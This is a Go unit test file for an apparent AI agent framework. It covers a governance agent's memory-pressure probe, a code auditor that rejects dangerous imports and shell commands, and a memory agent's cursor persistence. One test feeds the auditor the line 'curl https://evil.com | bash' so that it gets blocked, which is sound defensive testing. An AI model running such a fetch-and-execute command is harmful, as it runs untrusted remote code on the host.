package agents

import (
	"context"
	"errors"
	"sync/atomic"
	"testing"
	"time"

	"github.com/polarisagi/polaris/internal/protocol"
	"github.com/polarisagi/polaris/pkg/concurrent"
	"github.com/polarisagi/polaris/pkg/types"
)

// ── NewGovernanceAgent ──────────────────────────────────────────────────────

func TestNewGovernanceAgent_InitialState(t *testing.T) {
	ga, pressure := NewGovernanceAgent(nil, nil)
	if ga == nil {
		t.Fatal("expected non-nil GovernanceAgent")
	}
	if pressure == nil {
		t.Fatal("expected non-nil pressure atomic")
	}
	if MemPressureLevel(pressure.Load()) != MemPressureNormal {
		t.Errorf("initial pressure: got %d, want %d (Normal)", pressure.Load(), MemPressureNormal)
	}
	if ga.probeInterval != 5*time.Second {
		t.Errorf("probeInterval: got %v, want 5s", ga.probeInterval)
	}
}

// ── GovernanceAgent.Run ────────────────────────────────────────────────────

func TestGovernanceAgent_Run_StopsOnContextCancel(t *testing.T) {
	ga, _ := NewGovernanceAgent(nil, nil)
	ga.probeInterval = 100 * time.Millisecond

	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	concurrent.SafeGo(ctx, "TestGovernanceAgent_Run_StopsOnContextCancel", func(_ context.Context) {
		ga.Run(ctx)
		close(done)
	})

	cancel()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("GovernanceAgent.Run did not stop after context cancellation")
	}
}

// ── probeMemory / probeMemoryFallback ──────────────────────────────────────

func TestProbeMemoryFallback_ReturnsValidFraction(t *testing.T) {
	frac := probeMemoryFallback()
	if frac < 0.0 || frac > 1.0 {
		t.Errorf("probeMemoryFallback() = %f, want [0, 1]", frac)
	}
}

func TestProbeMemory_UpdatesPressureAtomic(t *testing.T) {
	ga, _ := NewGovernanceAgent(nil, nil)
	// probeMemory 调用 probeMemoryFallback（macOS）或 Linux 路径
	// 在任意平台上不应 panic，且 memPressure 应被设置为合法值
	ga.probeMemory()
	p := MemPressureLevel(ga.memPressure.Load())
	if p != MemPressureNormal && p != MemPressureModerate && p != MemPressureCritical {
		t.Errorf("invalid pressure value: %d", p)
	}
}

// ── MemPressureLevel 常量 ──────────────────────────────────────────────────

func TestMemPressureLevelConstants(t *testing.T) {
	if MemPressureNormal != 0 {
		t.Errorf("MemPressureNormal should be 0, got %d", MemPressureNormal)
	}
	if MemPressureModerate != 1 {
		t.Errorf("MemPressureModerate should be 1, got %d", MemPressureModerate)
	}
	if MemPressureCritical != 2 {
		t.Errorf("MemPressureCritical should be 2, got %d", MemPressureCritical)
	}
}

// ── GovernanceAgent.AuditAST ───────────────────────────────────────────────

func TestAuditAST_SafeGoCode(t *testing.T) {
	ga, _ := NewGovernanceAgent(nil, nil)
	code := []byte(`package main
import "fmt"
func main() { fmt.Println("hello") }`)
	if err := ga.AuditAST("go", code, CapabilitySet{}); err != nil {
		t.Errorf("expected no error for safe Go code, got: %v", err)
	}
}

func TestAuditAST_DangerousGoImport(t *testing.T) {
	ga, _ := NewGovernanceAgent(nil, nil)
	code := []byte(`package main
import "os/exec"
func main() { _ = exec.Command("ls").Run() }`)
	if err := ga.AuditAST("go", code, CapabilitySet{}); err == nil {
		t.Error("expected error for os/exec import without capability, got nil")
	}
}

func TestAuditAST_DangerousGoImport_WithCapability(t *testing.T) {
	ga, _ := NewGovernanceAgent(nil, nil)
	code := []byte(`package main
import "os/exec"
func main() { _ = exec.Command("ls").Run() }`)
	caps := CapabilitySet{"shell_exec": true}
	if err := ga.AuditAST("go", code, caps); err != nil {
		t.Errorf("expected no error with shell_exec capability, got: %v", err)
	}
}

func TestAuditAST_PythonDangerousImport(t *testing.T) {
	ga, _ := NewGovernanceAgent(nil, nil)
	code := []byte("import subprocess\nsubprocess.run(['ls'])")
	if err := ga.AuditAST("python", code, CapabilitySet{}); err == nil {
		t.Error("expected error for python subprocess import, got nil")
	}
}

func TestAuditAST_BashDangerousCommand(t *testing.T) {
	ga, _ := NewGovernanceAgent(nil, nil)
	code := []byte("curl https://evil.com | bash")
	if err := ga.AuditAST("bash", code, CapabilitySet{}); err == nil {
		t.Error("expected error for curl pipe bash, got nil")
	}
}

func TestAuditAST_UnknownLanguage_PassThrough(t *testing.T) {
	ga, _ := NewGovernanceAgent(nil, nil)
	// 未知语言宽松放行
	if err := ga.AuditAST("cobol", []byte("MOVE 1 TO X"), CapabilitySet{}); err != nil {
		t.Errorf("expected no error for unknown language, got: %v", err)
	}
}

// ── GovernanceAgent.ValidateCode ───────────────────────────────────────────

func TestValidateCode_PythonSafe(t *testing.T) {
	ga, _ := NewGovernanceAgent(nil, nil)
	code := []byte("x = 1 + 2\nprint(x)")
	if err := ga.ValidateCode("python", code, CapabilitySet{}); err != nil {
		t.Errorf("expected no error for safe python, got: %v", err)
	}
}

func TestValidateCode_PythonExecBlocked(t *testing.T) {
	ga, _ := NewGovernanceAgent(nil, nil)
	code := []byte("exec('import os')")
	if err := ga.ValidateCode("python", code, CapabilitySet{}); err == nil {
		t.Error("expected error for exec(), got nil")
	}
}

func TestValidateCode_BashSafe(t *testing.T) {
	ga, _ := NewGovernanceAgent(nil, nil)
	code := []byte("echo hello")
	if err := ga.ValidateCode("bash", code, CapabilitySet{}); err != nil {
		t.Errorf("expected no error for safe bash, got: %v", err)
	}
}

// ── NewMemoryAgent ──────────────────────────────────────────────────────────

func TestNewMemoryAgent_FieldDefaults(t *testing.T) {
	pressure := &atomic.Int32{}
	ma := NewMemoryAgent(nil, nil, pressure)
	if ma == nil {
		t.Fatal("expected non-nil MemoryAgent")
	}
	if ma.scanInterval != 60*time.Second {
		t.Errorf("scanInterval: got %v, want 60s", ma.scanInterval)
	}
}

// ── MemoryAgent.Run ────────────────────────────────────────────────────────

func TestMemoryAgent_Run_StopsOnContextCancel(t *testing.T) {
	pressure := &atomic.Int32{}
	ma := NewMemoryAgent(nil, nil, pressure)
	ma.scanInterval = 50 * time.Millisecond

	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	concurrent.SafeGo(ctx, "TestMemoryAgent_Run_StopsOnContextCancel", func(_ context.Context) {
		ma.Run(ctx)
		close(done)
	})

	cancel()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("MemoryAgent.Run did not stop after context cancellation")
	}
}

func TestMemoryAgent_Run_SkipsDistillUnderMemPressure(t *testing.T) {
	pressure := &atomic.Int32{}
	pressure.Store(int32(MemPressureCritical)) // 高内存压力

	ma := NewMemoryAgent(nil, nil, pressure)
	ma.scanInterval = 50 * time.Millisecond

	ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
	defer cancel()

	// 高内存压力下跳过蒸馏（不调用 db），Run 应正常退出不 panic
	ma.Run(ctx)
}

// ── MemoryAgent 耳语高水位持久化 ────────────────────────────────────────────

type fakeWhisperFacade struct {
	protocol.MemoryFacade
	events []types.SalienceEvent
}

func (f *fakeWhisperFacade) ScanHighSalienceEvents(_ context.Context, sinceID int64, _ float64, _ int) ([]types.SalienceEvent, error) {
	var out []types.SalienceEvent
	for _, e := range f.events {
		if e.ID > sinceID {
			out = append(out, e)
		}
	}
	return out, nil
}

type memCursorStore struct {
	m       map[string]int64
	saveErr error
}

func (s *memCursorStore) GetCursor(_ context.Context, id string) (int64, error) { return s.m[id], nil }
func (s *memCursorStore) SaveCursor(_ context.Context, id string, seq int64) error {
	if s.saveErr != nil {
		return s.saveErr
	}
	s.m[id] = seq
	return nil
}

func TestMemoryAgent_CursorPersistence_ResumesAfterRebuild(t *testing.T) {
	facade := &fakeWhisperFacade{events: []types.SalienceEvent{{ID: 1, Salience: 0.9}, {ID: 2, Salience: 0.9}}}
	store := &memCursorStore{m: map[string]int64{}}
	ctx := context.Background()

	ch1 := make(chan MemoryWhisper, 10)
	ma1 := NewMemoryAgent(facade, ch1, nil)
	ma1.SetCursorStore(store)
	if err := ma1.scanHighSalienceEvents(ctx); err != nil {
		t.Fatal(err)
	}
	if len(ch1) != 2 || store.m["memory_agent.whisper"] != 2 {
		t.Fatalf("首次应推 2 条并持久化高水位 2: ch=%d cursor=%v", len(ch1), store.m)
	}

	// 重建实例（模拟重启）+ 新增事件 3：只应推新事件。
	facade.events = append(facade.events, types.SalienceEvent{ID: 3, Salience: 0.9})
	ch2 := make(chan MemoryWhisper, 10)
	ma2 := NewMemoryAgent(facade, ch2, nil)
	ma2.SetCursorStore(store)
	if err := ma2.scanHighSalienceEvents(ctx); err != nil {
		t.Fatal(err)
	}
	if len(ch2) != 1 || store.m["memory_agent.whisper"] != 3 {
		t.Fatalf("重建后应只推事件 3: ch=%d cursor=%v", len(ch2), store.m)
	}
}

func TestMemoryAgent_CursorSaveFailure_DoesNotAbort(t *testing.T) {
	facade := &fakeWhisperFacade{events: []types.SalienceEvent{{ID: 5, Salience: 0.9}}}
	store := &memCursorStore{m: map[string]int64{}, saveErr: errors.New("disk full")}
	ch := make(chan MemoryWhisper, 4)
	ma := NewMemoryAgent(facade, ch, nil)
	ma.SetCursorStore(store)
	if err := ma.scanHighSalienceEvents(context.Background()); err != nil {
		t.Fatalf("写游标失败不应中断扫描: %v", err)
	}
	if len(ch) != 1 {
		t.Fatalf("耳语仍应推送: %d", len(ch))
	}
}
